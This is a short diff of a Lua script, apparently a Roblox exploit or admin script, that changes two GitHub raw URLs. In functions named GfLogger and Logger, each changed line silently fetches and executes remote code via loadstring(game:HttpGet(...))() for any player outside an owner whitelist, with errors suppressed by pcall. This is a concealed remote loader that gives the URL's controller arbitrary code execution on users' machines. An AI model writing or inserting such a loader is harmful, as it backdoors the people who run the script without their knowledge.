@@ -565,7 +565,7 @@ function GfLogger()
     }
 if not id[plr.UserId] then
         local success, errorMessage = pcall(function()
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/"))()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
         end)
 
         if not success then
@@ -6897,7 +6897,7 @@ end
 local function Logger()
     if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
         end)
     end
 end
